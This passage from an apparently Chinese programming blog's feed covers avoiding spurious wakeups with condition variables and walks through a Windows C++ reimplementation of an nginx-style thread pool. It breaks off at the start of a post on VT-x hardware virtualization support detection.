<span class="keyword">with</span> cond:</span><br><span class="line">        counter += <span class="number">1</span></span><br><span class="line">        <span class="comment"># 通知等待线程</span></span><br><span class="line">        cond.notify()</span><br></pre></td></tr></table></figure><p>在这个示例中，我们首先定义了一个共享变量counter，它将被多个线程同时访问和修改。然后，我们创建了一个条件变量cond，它将用于等待和通知线程。在worker函数中，我们首先获取条件变量，然后使用循环来检查条件是否满足。如果条件不满足，线程将等待条件变量。在主线程中，我们修改了共享变量counter，然后通知等待线程。在worker函数中，线程被唤醒后，会再次检查条件是否满足，如果条件满足，就会修改共享变量counter。这样，我们就可以避免虚假唤醒的问题，确保线程只有在满足条件的情况下才会被唤醒。</p><p>总之，虚假唤醒是多线程编程中常见的问题，需要特别注意。在Python中，可以使用threading模块中的Condition类来实现条件变量，并使用循环来避免虚假唤醒的问题。 </p><p>在c++中，如果要解决，需要在传入timeout的同时传入一个函数指针，当二者同时满足的时候才能继续向下执行。</p><h2 id="nginx线程池"><a href="#nginx线程池" class="headerlink" title="nginx线程池"></a>nginx线程池</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ngx_thread_pool_queue_init(q)                                         \</span></span><br><span class="line"><span class="meta">    (q)-&gt;first = NULL;                                                        \</span></span><br><span class="line"><span class="meta">    (q)-&gt;last = &amp;(q)-&gt;first</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//任务节点</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ngx_thread_task_t</span> &#123;</span><br><span class="line"><span class="type">ngx_thread_task_t</span>* next; <span class="comment">//使用列表保存任务节点</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>       id;   <span class="comment">//对该任务的一个标识</span></span><br><span class="line"><span class="type">void</span>* ctx;               <span class="comment">//用户数据私有数据</span></span><br><span class="line"><span class="built_in">void</span>               (*handler)(<span class="type">void</span>* ctx); <span class="comment">//处理私用数据的函数</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line"><span class="type">ngx_thread_task_t</span>* first;</span><br><span class="line"><span class="type">ngx_thread_task_t</span>** last;</span><br><span class="line">&#125; <span class="type">ngx_thread_pool_queue_t</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//线程池的管理员</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ngx_thread_pool_t</span> &#123;</span><br><span class="line"></span><br><span class="line">SRWLOCK       lock;         <span class="comment">//读写锁 条件变量</span></span><br><span class="line"><span class="type">ngx_thread_pool_queue_t</span>   queue;          <span class="comment">//存放任务节点的队列  内存池</span></span><br><span class="line"><span class="type">int</span>                 waiting;</span><br><span class="line">CONDITION_VARIABLE          cond;         <span class="comment">//条件变量</span></span><br><span class="line"><span class="type">int</span>                threads;      <span class="comment">//池中的配置的线程最大个数</span></span><br><span class="line"><span class="type">int</span>                 max_queue;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">ngx_thread_pool_t</span>*</span></span><br><span class="line"><span class="function"><span class="title">ngx_thread_pool_config</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> threads)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span></span></span><br><span class="line"><span class="function"><span class="title">ngx_thread_pool_init_worker</span><span class="params">(<span class="type">ngx_thread_pool_t</span>* tp)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">ngx_thread_pool_exit_worker</span><span class="params">(<span class="type">ngx_thread_pool_t</span>* tp)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span></span></span><br><span class="line"><span class="function"><span class="title">ngx_thread_task_post</span><span class="params">(<span class="type">ngx_thread_pool_t</span>* tp, <span class="type">ngx_thread_task_t</span>* task)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;浅谈nginx线程池.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//条件变量</span></span><br><span class="line"><span class="comment">//读写锁</span></span><br><span class="line"><span class="type">static</span> <span class="type">ngx_thread_pool_t</span> g_tp;    <span class="comment">//定义了一个全局静态的线程池管理员结构体</span></span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">int</span>               ngx_thread_pool_task_id;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">int</span></span></span><br><span class="line"><span class="function"><span class="title">ngx_thread_pool_init</span><span class="params">(<span class="type">ngx_thread_pool_t</span>* tp)</span></span>;</span><br><span class="line"><span class="function"><span class="type">static</span> DWORD WINAPI</span></span><br><span class="line"><span class="function"><span class="title">ngx_thread_pool_cycle</span><span class="params">(<span class="type">void</span>* ctx)</span></span>;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">ngx_thread_pool_destroy</span><span class="params">(<span class="type">ngx_thread_pool_t</span>* tp)</span></span>;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">ngx_thread_pool_exit_handler</span><span class="params">(<span class="type">void</span>* ctx)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">ngx_thread_pool_t</span>*</span></span><br><span class="line"><span class="function"><span class="title">ngx_thread_pool_config</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> threads)</span> <span class="comment">//设置的线程个数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> max_queue = <span class="number">65536</span>;  <span class="comment">//任务队列</span></span><br><span class="line"><span class="keyword">if</span> (threads &lt; <span class="number">1</span>) </span><br><span class="line">&#123;</span><br><span class="line">threads = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">ngx_thread_pool_t</span>* tp = &amp;g_tp;   <span class="comment">//全局静态结构体</span></span><br><span class="line"><span class="keyword">if</span> (tp-&gt;threads)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> tp;</span><br><span class="line">&#125;</span><br><span class="line">tp-&gt;threads = threads;    <span class="comment">//设置线程池中的线程个数</span></span><br><span class="line">tp-&gt;max_queue = max_queue;</span><br><span class="line"><span class="keyword">return</span> tp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span></span></span><br><span class="line"><span class="function"><span class="title">ngx_thread_pool_init_worker</span><span class="params">(<span class="type">ngx_thread_pool_t</span>* tp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//日志信息记录</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">ngx_thread_pool_init</span>(tp) != <span class="literal">true</span>) </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">int</span></span></span><br><span class="line"><span class="function"><span class="title">ngx_thread_pool_init</span><span class="params">(<span class="type">ngx_thread_pool_t</span>* tp)</span>  <span class="comment">//网络 文件读写  组件与组件IO操作</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span>             err;</span><br><span class="line">DWORD       tid;</span><br><span class="line">SECURITY_ATTRIBUTES  SecurityAttributes = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">bool</span>  IsOk = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">ngx_thread_pool_queue_init</span>(&amp;(tp-&gt;queue));   <span class="comment">//初始化队列</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建读写锁</span></span><br><span class="line"><span class="built_in">InitializeSRWLock</span>(&amp;(tp-&gt;lock));<span class="comment">//初始化读写锁    线程同步</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建条件变量</span></span><br><span class="line"><span class="built_in">InitializeConditionVariable</span>(&amp;(tp-&gt;cond));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//可以在这里进行线程池中的线程属性设置 </span></span><br><span class="line"><span class="comment">//IsOk = pthread_attr_init(&amp;attr);    </span></span><br><span class="line"><span class="keyword">if</span> (IsOk == <span class="literal">false</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//为线程池创建线程</span></span><br><span class="line"><span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (n = <span class="number">0</span>; n &lt; tp-&gt;threads; n++) </span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//线程栈的默认大小是1M</span></span><br><span class="line">HANDLE ThreadHandle = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>,<span class="number">0</span>,(LPTHREAD_START_ROUTINE)ngx_thread_pool_cycle, tp,<span class="number">0</span>,&amp;tid);</span><br><span class="line"><span class="keyword">if</span> (ThreadHandle == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//线程回收  </span></span><br><span class="line"><span class="comment">//工作队列任务节点进行销毁</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//(void)pthread_attr_destroy(&amp;attr);   //销毁之前为线程设置属性时产生的动态内存</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">static</span> DWORD WINAPI</span></span><br><span class="line"><span class="function"><span class="title">ngx_thread_pool_cycle</span><span class="params">(LPVOID ctx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">ngx_thread_pool_t</span>* tp = (<span class="type">ngx_thread_pool_t</span>*)ctx;  <span class="comment">//线程池管理员</span></span><br><span class="line"><span class="type">ngx_thread_task_t</span>* task;</span><br><span class="line">    <span class="keyword">for</span> (;;) </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">AcquireSRWLockExclusive</span>(&amp;(tp-&gt;lock));  <span class="comment">//获得SRW锁 独占权</span></span><br><span class="line">        tp-&gt;waiting--;   <span class="comment">//注意看看有没有初始化</span></span><br><span class="line">        <span class="keyword">while</span> (tp-&gt;queue.first == <span class="literal">NULL</span>) <span class="comment">//看看有无任务</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">SleepConditionVariableSRW</span>(&amp;tp-&gt;cond, &amp;tp-&gt;lock, INFINITE, <span class="literal">NULL</span>) == <span class="literal">false</span>)   <span class="comment">//释放锁  Sleep 等待通知唤醒重新拿到锁的控制权</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="comment">//调用上述函数失败</span></span><br><span class="line"><span class="built_in">ReleaseSRWLockExclusive</span>(&amp;tp-&gt;lock);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//如果任务存在</span></span><br><span class="line">        task = tp-&gt;queue.first;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (task-&gt;next != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">tp-&gt;queue.first = task-&gt;next;   <span class="comment">//队列任务下移  </span></span><br><span class="line">&#125;</span><br><span class="line">        <span class="keyword">if</span> (tp-&gt;queue.first == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//只有上述一个任务的时候 将Last域置空</span></span><br><span class="line">            tp-&gt;queue.last = &amp;tp-&gt;queue.first;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="built_in">ReleaseSRWLockExclusive</span>(&amp;tp-&gt;lock);</span><br><span class="line"><span class="comment">//处理队列中的认为</span></span><br><span class="line">        task-&gt;<span class="built_in">handler</span>(task-&gt;ctx);   <span class="comment">//将任务插入到队列的时候都会放置处理函数</span></span><br><span class="line">        task-&gt;next = <span class="literal">NULL</span>;          <span class="comment">//当前任务从 任务队列中断开</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//假如task是使用了动态申请 一定要主要回收</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span></span></span><br><span class="line"><span class="function"><span class="title">ngx_thread_task_post</span><span class="params">(<span class="type">ngx_thread_pool_t</span>* tp, <span class="type">ngx_thread_task_t</span>* task)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">AcquireSRWLockExclusive</span>(&amp;tp-&gt;lock);  <span class="comment">//获得SRW锁  </span></span><br><span class="line"><span class="keyword">if</span> (tp-&gt;waiting &gt;= tp-&gt;max_queue) </span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">ReleaseSRWLockExclusive</span>(&amp;tp-&gt;lock);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">task-&gt;id = ngx_thread_pool_task_id++;   <span class="comment">//使用全局变量为每个任务节点进行编号</span></span><br><span class="line">task-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">WakeConditionVariable</span>(&amp;tp-&gt;cond);       <span class="comment">//通知工作线程</span></span><br><span class="line">*tp-&gt;queue.last = task;</span><br><span class="line">tp-&gt;queue.last = &amp;task-&gt;next;</span><br><span class="line">tp-&gt;waiting++;</span><br><span class="line"><span class="built_in">ReleaseSRWLockExclusive</span>(&amp;tp-&gt;lock);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">ngx_thread_pool_exit_worker</span><span class="params">(<span class="type">ngx_thread_pool_t</span>* tp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">ngx_thread_pool_destroy</span>(tp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">ngx_thread_pool_destroy</span><span class="params">(<span class="type">ngx_thread_pool_t</span>* tp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>           n;</span><br><span class="line"><span class="type">ngx_thread_task_t</span>     task;    <span class="comment">//投递退出循环的任务</span></span><br><span class="line"><span class="keyword">volatile</span> <span class="type">unsigned</span> <span class="type">int</span> lock;    <span class="comment">//不允许从寄存器中获取该数据  </span></span><br><span class="line"><span class="built_in">ZeroMemory</span>(&amp;task, <span class="built_in">sizeof</span>(<span class="type">ngx_thread_task_t</span>));</span><br><span class="line">task.handler = ngx_thread_pool_exit_handler;     <span class="comment">//杀死当前线程</span></span><br><span class="line">task.ctx = (<span class="type">void</span>*)&amp;lock;</span><br><span class="line"><span class="keyword">for</span> (n = <span class="number">0</span>; n &lt; tp-&gt;threads; n++)</span><br><span class="line">&#123;</span><br><span class="line">lock = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">ngx_thread_task_post</span>(tp, &amp;task) != <span class="literal">true</span>)   <span class="comment">//开一枪 死一个</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (lock)    </span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">ngx_thread_pool_exit_handler</span><span class="params">(<span class="type">void</span>* data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;ThreadIdentify:%d ngx_thread_pool_exit_handler()\r\n&quot;</span>), <span class="built_in">GetCurrentThreadId</span>());</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>* lock = (<span class="type">unsigned</span> <span class="type">int</span>*)data;</span><br><span class="line">*lock = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">ExitThread</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;浅谈nginx线程池.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//条件变量 读写锁</span></span><br><span class="line"><span class="comment">//数据结构</span></span><br><span class="line"><span class="comment">//销毁线程池</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">ngx_thread_handler</span><span class="params">(<span class="type">void</span>* ctx)</span></span>;   <span class="comment">//只能在当前CPP文件中被调用</span></span><br><span class="line"><span class="type">void</span> _tmain()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">ngx_thread_task_t</span>    task[<span class="number">2</span>];      <span class="comment">//处理任务</span></span><br><span class="line"><span class="built_in">ZeroMemory</span>(task, <span class="built_in">sizeof</span>(<span class="type">ngx_thread_task_t</span>) * <span class="number">2</span>);   <span class="comment">//内存进行初始</span></span><br><span class="line"><span class="type">int</span> ctx1 = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> ctx2 = <span class="number">2</span>;</span><br><span class="line">task[<span class="number">0</span>].handler = ngx_thread_handler;  <span class="comment">//处理数据的函数</span></span><br><span class="line">task[<span class="number">0</span>].ctx = (<span class="type">void</span>*)&amp;ctx1;</span><br><span class="line"></span><br><span class="line">task[<span class="number">1</span>].handler = ngx_thread_handler;</span><br><span class="line">task[<span class="number">1</span>].ctx = (<span class="type">void</span>*)&amp;ctx2;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//线程池初始化 必须指定线程池中的线程个数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//获取当前系统信息</span></span><br><span class="line">SYSTEM_INFO SystemInfo = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">GetSystemInfo</span>(&amp;SystemInfo);</span><br><span class="line">DWORD dwNumberOfProcessors = SystemInfo.dwNumberOfProcessors;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//线程池进行信息配置</span></span><br><span class="line"><span class="type">ngx_thread_pool_t</span>* tp = <span class="built_in">ngx_thread_pool_config</span>(<span class="number">3</span>);   <span class="comment">//线程池的管理员</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//线程池进行初始化</span></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span> != <span class="built_in">ngx_thread_pool_init_worker</span>(tp)) </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">goto</span> done;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//投递任务</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">ngx_thread_task_post</span>(tp, &amp;task[<span class="number">0</span>]) != <span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">ngx_thread_task_post</span>(tp, &amp;task[<span class="number">1</span>]) != <span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">done:</span><br><span class="line"><span class="built_in">ngx_thread_pool_exit_worker</span>(tp);   <span class="comment">//通知工作线程解散   </span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">ngx_thread_handler</span><span class="params">(<span class="type">void</span>* ctx)</span>  <span class="comment">//任务节点的数据处理函数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> v1 = *(<span class="type">int</span>*)ctx;</span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;ThreadIdentify:%d ngx_thread_handler() %d\r\n&quot;</span>),<span class="built_in">GetCurrentThreadId</span>(),v1);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Windows Programming </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>VT-x</title>
      <link href="/2024/02/04/VT-x/"/>
      <url>/2024/02/04/VT-x/</url>
      
        <content type="html"><![CDATA[<h1 id="虚拟化"><a href="#虚拟化" class="headerlink" title="虚拟化"></a>虚拟化</h1><center>目录（点击跳转）<center><p>[TOC]</p><div style="page-break-after:always;"></div><h1 id="检查硬件虚拟化"><a href="#检查硬件虚拟化" class="headerlink" title="检查硬件虚拟化"></a>检查硬件虚拟化</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOLEAN <span class="title">HvmIsHVSupported</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CPU_VENDOR vendor = <span class="built_in">UtilCPUVendor</span>();<span class="comment">// CPU供应商</span></span><br><span class="line">    <span class="keyword">if</span> (vendor == CPU_Intel)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">VmxHardSupported</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="UtilCPUVendor获取CPU制造商信息"><a href="#UtilCPUVendor获取CPU制造商信息" class="headerlink" title="UtilCPUVendor获取CPU制造商信息"></a>UtilCPUVendor获取CPU制造商信息</h2><figure class="highlight 